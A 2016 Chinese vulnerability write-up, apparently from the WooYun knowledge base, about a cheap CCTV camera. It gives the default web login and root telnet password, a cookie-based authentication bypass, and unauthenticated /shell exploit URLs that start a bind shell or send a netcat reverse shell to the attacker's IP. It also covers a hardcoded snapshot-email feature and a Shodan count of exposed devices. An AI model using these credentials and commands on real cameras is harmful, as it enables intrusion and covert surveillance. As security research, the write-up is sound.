<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">某CCTV摄像头漏洞分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mickey</a> <span class="bull">·</span> <time title="2016/02/18 11:02" ui-time="" datetime="2016/02/18 11:02" class="published ng-binding ng-isolate-scope">2016/02/18 11:02</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 漏洞分析</h1><hr><p>今天看老外分析了一款廉价CCTV摄像头的文章，地址在<a href="https://www.pentestpartners.com/blog/pwning-cctv-cameras/">https://www.pentestpartners.com/blog/pwning-cctv-cameras/</a>，摄像头的amazon购买地址是<a href="http://www.amazon.co.uk/dp/B0162AQCO4">http://www.amazon.co.uk/dp/B0162AQCO4</a>，老外曝光的漏洞主要有四个，分别是默认密码，web登陆认证绕过，内建的webshell，以及发送摄像图片到硬编码的邮箱地址，老外的文章经过我的测试，有错误和不全的地方，我都一一补充在下面了 ：）</p><h3>1. 默认密码</h3><p>WEB默认登陆名是admin，密码是空。</p><p>另外经过破解passwd，发现root的默认密码是"juantech"，可以通过telnet登录直接获取cmdshell，如图1:</p><p><img alt="enter image description here" img-src="eb420eb943acfbe8be0125d9f77a55bedaa833cd.jpg"></p><h3>2. WEB认证绕过</h3><p>当你第一次访问的时候，index.html会要求你输入用户名和密码，输入正确，则跳转到view2.html。如果你直接访问view2.html，会被重定向到index.html，要求你输入帐户信息。下载固件用binwalk解压，如图2：</p><p><img alt="enter image description here" img-src="baefef2743a4b6d333a569ce000fe139af8be2fa.jpg"></p><p>查看view2.js，发现以下内容：</p><pre><code>#!js
$(document).ready(function(){
    dvr_camcnt = Cookies.get(“dvr_camcnt");
    dvr_usr = Cookies.get("dvr_usr");
    dvr_pwd = Cookies.get("dvr_pwd");
    if(dvr_camcnt == null || dvr_usr == null || dvr_pwd == null)
    {
        location.href = "/index.html";
    }
</code></pre><p>可以看到，如果<code>dvr_camcnt,dvr_usr,dvr_pwd</code>这3个值为空，就会跳转到index.html，所以我们只要将<code>dvr_camcnt,dvr_usr,dvr_pwd</code>设置不为空就可以了，通过查看view2.js源码可以知道,<code>dvr_camcnt</code>其实是控制频道(chanel)的，如下：</p><pre><code>#!js
function goto_open_all()
 80 {   
 81     if(dvr_viewer &amp;&amp; dvr_viewer.ConnectRTMP)
 82     {
 83         dvr_viewer.SetPlayerNum(dvr_camcnt);
 84 //      switch(dvr_camcnt)
 85 //      {
 86 //      case "4":
 87 //          dvr_viewer.flSetViewDiv(4);
 88 //          break;
 89 //      case "8":
 90 //          dvr_viewer.flSetViewDiv(9);
 91 //          break;
 92 //      case "16":
 93 //          dvr_viewer.flSetViewDiv(16);
 94 //          break;
 95 //      case "24":
 96 //          dvr_viewer.flSetViewDiv(25);
 97 //          break;
 98 //      }
 99         open_all(dvr_camcnt);
100     }
101     else
102     {
103         dvr_viewer = $("#viewer")[0];
104         setTimeout(goto_open_all, 1000);
105     }
106 }   
</code></pre><p>原文说dvr_camcnt只能设置2，4，8，24这几个值。实际测试，输入其他值都可以的。绕过登陆认证的证明如图3</p><p><img alt="enter image description here" img-src="879e0cba40832f23301599c84f39e105b3e81151.jpg"></p><h3>3.内建的webshell</h3><p>通过查看解压后的固件目录，我们发现dvr_app包含了web服务，使用strings查看<code>dvr_app</code>二进制，可以看到 <code>/moo,/whoami,/shell,/snapshot</code> 等字符，尝试访问，发现没有任何验证就可以访问这些功能，如图4，</p><p><img alt="enter image description here" img-src="a21a81561479ab14799d64a327beb28671a31026.jpg"></p><p>访问<code>/shell</code>的时候，卡住了，把<code>dvr_app</code>拖入ida，查看shell功能相应的处理逻辑，因为是固件是ARM小端的架构，可以直接在IDA里F5看伪代码。如图5</p><p><img alt="enter image description here" img-src="ddb835b8abea7d949fdb7a9398deb7893ab1b0ac.jpg"></p><p>这里利用有2个方式，一个是直接telnetd绑定/bin/sh到任意端口，然后telnet连接过去，不需要认证就可以telnet登录，这个利用方式在你不知道固件本身TELNET的账户信息的时候，是个很常见的利用方法。命令如下：</p><pre><code>http://目标ip/shell?/usr/sbin/telnetd -l/bin/sh -p 25
</code></pre><p>但是实际测试还要考虑防火墙/NAT的问题，好多设备仅仅映射80出来，你开通的其他端口，虽然设备打开了，但是你连接不上去。如图6.</p><p><img alt="enter image description here" img-src="2bd2664df58e91f790c357db9d6482e2b5e32032.jpg"></p><p>这时候你可以用nc反弹shell出来，估计是因为固件版本不一样，我测试的目标busybox里是自带nc的，所以通过执行</p><pre><code>http://目标ip/shell?/bin/busybox nc 我的IP 53 -e /bin/sh
</code></pre><p>就可以获取到反弹的cmdshell了，如图7</p><p><img alt="enter image description here" img-src="81f574d4e56c9a1ba71853d2f86ef2e49150ed58.jpg"></p><p>文章说他的固件的busybox没有带nc，所以他静态编译了一个busybox，然后通过wget下载到一个可写的目录，然后赋予busybox可执行权限，最后运行nc命令。他已经提供了编译好的busybox，可以通过<code>http://212.111.43.161/busybox</code>来下载。</p><h3>4.发送摄像图片到硬编码的邮箱地址</h3><p>通过strings查看dvr_app二进制,还发现了另一处可疑的字符串</p><p>.rodata:002260E0 0000005A C <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e7938695808293da8b86908e948f829582a79e82868fc9898293">[email&#160;protected]</a>&amp;subject=Who are you?&amp;content=%s&amp;snapshot=yes&amp;vin=0&amp;size=320x180</p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="52bbd2c8baedd5b7cefa353b263a2730b6ead8b4c2ceb5e6f0b0d2ce3e33253b213a372037122b37333a7c3c3726">[email&#160;protected]</a>",找到了https://github.com/simonjiuan/ipc/blob/master/src/cgi_misc.c，通过源码可以看到</p><pre><code>#!c
#define DEFAULT_USER_EMAIL "<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9afeece8efe9ffe8daffe9ffffabaaaab4f9f5f7">[email&#160;protected]</a>"
#define DEFAULT_USER_PASSWORD "dvrhtml"
#define DEFAULT_SMTP_SERVER "mail.esee100.com"
#define DEAFULT_TARGE_EMAIL "<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a6cac7d1cfd5cec3d4c3e6dfc3c7ce88c8c3d2">[email&#160;protected]</a>"
</code></pre><p>@hdmoore在twitter也提到这个中国邮箱，所以我略微的看了看。目前mail.esee100.com已经不解析了，但是esee100.com的CNMAE解析到了www.dvrskype.com。通过查询www.dvrskype.com的域名信息，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fa1f75551e415f1d66711f724a1f65651f6a771d607e1c715f1c6673127a7f1c6255999b95898e958897bacbccc9d4999597">[email&#160;protected]</a>，如图8，注意这里ORG是"广州市九安光电技术有限公司",而github的上传者也是九安光电技术的技术人员。通过图9可以看到，他会把/whoami的返回信息和CCTV摄像头启动时的拍摄<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3fd8a5bbd8ba98d8b6b8dab0aedab78f535e48564c575a4d5a7f465a5e5711515a4b">[email&#160;protected]</a>，当然现在这个SMTP发送服务器已经不存在了，也有可能是当时开发留下的测试的功能。</p><h1>0x01 全球统计</h1><hr><p>因为是运行的自定义的web服务器，HTTP服务器头包含明显的“JAWS/1.0”特征，最近sans比较关注国内的漏洞扫描（https://isc.sans.edu/forums/diary/Scanning+for+Fortinet+ssh+backdoor/20635/），所以我就直接用shodan的结果了。如图10</p><p><img alt="enter image description here" img-src="cd90a2430208049c79afd528302d4e685a88a09f.jpg"></p><p>可以看到这款廉价的CCTV摄像头对公网开放的全球大概有42545台，最常用的端口是80/8080，用的最多的国家是土耳其，印度，越南。 ：）</p><p>目前应该也有对这个CCTV摄像头的自动化恶意利用了，通过查看几个，发现几台设备的进程里都包含</p><pre><code> 1560 root       620 S    ./dropbear -p 15081 -r /tmp/dropbear/dropbear_rsa_ho
</code></pre><p>以及wget远程下载恶意利用文件。</p><h1>0x02 漏洞防护</h1><hr><p>目前官方还没有补丁固件，建议不要对外开放80/23等管理端口。</p><h1>0x03 感谢的人</h1><hr><p>感谢低调的张老师教我逆向知识，张老师的好和善是对我问的幼稚问题都耐心的回答，从来没烦过。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2730" rel="bookmark" id="re1">CoolShell解密游戏的WriteUp</a></li><li><a href="http://drops.wooyun.org/papers/501" rel="bookmark" id="re2">CVE-2012-0053详解</a></li><li><a href="http://drops.wooyun.org/papers/548" rel="bookmark" id="re3">WebView中接口隐患与手机挂马利用</a></li><li><a href="http://drops.wooyun.org/papers/9979" rel="bookmark" id="re4">Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">adadf</span> <span class="reply-time">2016-03-14 15:51:16</span></div><p></p><p>膜拜背后的张老师</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bhunter</span> <span class="reply-time">2016-02-19 13:36:55</span></div><p></p><p>这款摄像头我遇到过，一个创新大会会场大楼里的一个小公司就用的这款摄像头。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">叫我阿米</span> <span class="reply-time">2016-02-18 17:11:48</span></div><p></p><p>张老师永远那么的低调，于牛还是永远的那么流弊。 膜拜！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">her0ma</span> <span class="reply-time">2016-02-18 16:43:57</span></div><p></p><p>Mickey老师永远都是辣么屌，膜拜!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">HackBraid</span> <span class="reply-time">2016-02-18 15:52:00</span></div><p></p><p>mickey老师永远都是那么屌<br>张老师永远那么低调</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SPRITEKING</span> <span class="reply-time">2016-02-18 13:53:12</span></div><p></p><p>膜拜全能的与牛跟张老师</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">千域千寻</span> <span class="reply-time">2016-02-18 13:02:52</span></div><p></p><p>mickey老湿永远是这么的屌···又学习了···</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phantomer</span> <span class="reply-time">2016-02-18 11:56:56</span></div><p></p><p>张老师永远那么的低调，于牛还是永远的那么流弊。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phantom0307</span> <span class="reply-time">2016-02-18 11:16:59</span></div><p></p><p>666，楼主还做了详细的测试</p><p></p></div></div></div></div></div></main>